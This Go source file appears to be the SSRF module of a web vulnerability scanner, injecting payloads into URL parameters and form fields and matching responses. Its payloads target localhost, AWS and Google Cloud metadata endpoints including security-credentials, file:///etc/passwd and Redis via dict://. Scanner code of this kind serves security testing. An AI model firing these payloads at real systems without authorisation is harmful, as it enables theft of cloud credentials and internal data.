package ssrf

import (
	"io"
	"net/http"
	"strings"

	"github.com/eonedge/vulnscan/pkg/crawler"
	"github.com/eonedge/vulnscan/pkg/scanner"
	"github.com/eonedge/vulnscan/pkg/utils"
)

// SSRFModule implements Server-Side Request Forgery vulnerability scanning
type SSRFModule struct{}

// NewSSRFModule creates a new SSRF module
func NewSSRFModule() *SSRFModule {
	return &SSRFModule{}
}

func (m *SSRFModule) Name() string        { return "ssrf" }
func (m *SSRFModule) Description() string  { return "Server-Side Request Forgery (SSRF) vulnerability scanner" }

// Scan scans an endpoint for SSRF vulnerabilities
func (m *SSRFModule) Scan(client *utils.HTTPClient, endpoint crawler.Endpoint) []scanner.Vulnerability {
	var vulns []scanner.Vulnerability

	// SSRF payloads
	payloads := []struct {
		payload    string
		pattern    string
		severity   scanner.Severity
		desc       string
	}{
		{
			payload:  "http://127.0.0.1",
			pattern:  "(?i)(localhost|127\\.0\\.0\\.1|0\\.0\\.0\\.0)",
			severity: scanner.SeverityHigh,
			desc:     "SSRF via localhost",
		},
		{
			payload:  "http://169.254.169.254/latest/meta-data/",
			pattern:  "(?i)(ami-id|instance-id|security-credentials)",
			severity: scanner.SeverityCritical,
			desc:     "SSRF via AWS metadata endpoint",
		},
		{
			payload:  "http://metadata.google.internal",
			pattern:  "(?i)(metadata|instance)",
			severity: scanner.SeverityCritical,
			desc:     "SSRF via Google Cloud metadata",
		},
		{
			payload:  "file:///etc/passwd",
			pattern:  "root:.*:0:0:",
			severity: scanner.SeverityCritical,
			desc:     "SSRF via file protocol",
		},
		{
			payload:  "dict://127.0.0.1:6379/info",
			pattern:  "(?i)(redis_version|connected_clients)",
			severity: scanner.SeverityCritical,
			desc:     "SSRF via dict protocol to Redis",
		},
	}

	// Test each parameter
	for param := range endpoint.Params {
		for _, p := range payloads {
			// Inject payload into parameter
			testURL, err := utils.InjectParam(endpoint.URL, param, p.payload)
			if err != nil {
				continue
			}

			// Send request
			resp, err := client.Get(testURL)
			if err != nil {
				continue
			}

			// Read response body
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(body)

			// Check for SSRF patterns
			if utils.ContainsPattern(bodyStr, p.pattern) {
				vuln := scanner.Vulnerability{
					Type:        "SSRF",
					Severity:    p.severity,
					URL:         endpoint.URL,
					Parameter:   param,
					Payload:     p.payload,
					Description: p.desc,
					Evidence:    utils.ExtractContext(bodyStr, p.payload),
					Timestamp:   utils.GetCurrentTime(),
				}
				vulns = append(vulns, vuln)
			}
		}
	}

	// Test forms
	for _, form := range endpoint.Forms {
		for param := range form.Inputs {
			for _, p := range payloads {
				// Prepare form data
				formData := make(map[string]string)
				for k, v := range form.Inputs {
					if k == param {
						formData[k] = p.payload
					} else {
						formData[k] = v
					}
				}

				// Send request
				var resp *http.Response
				var err error

				if strings.ToUpper(form.Method) == "POST" {
					values := make(map[string][]string)
					for k, v := range formData {
						values[k] = []string{v}
					}
					resp, err = client.Post(form.Action, values)
				} else {
					testURL := form.Action + "?"
					for k, v := range formData {
						testURL += k + "=" + v + "&"
					}
					resp, err = client.Get(testURL)
				}

				if err != nil {
					continue
				}

				body, err := io.ReadAll(resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}
				bodyStr := string(body)

				if utils.ContainsPattern(bodyStr, p.pattern) {
					vuln := scanner.Vulnerability{
						Type:        "SSRF",
						Severity:    p.severity,
						URL:         form.Action,
						Parameter:   param,
						Payload:     p.payload,
						Description: p.desc + " (form submission)",
						Evidence:    utils.ExtractContext(bodyStr, p.payload),
						Timestamp:   utils.GetCurrentTime(),
					}
					vulns = append(vulns, vuln)
				}
			}
		}
	}

	return vulns
}
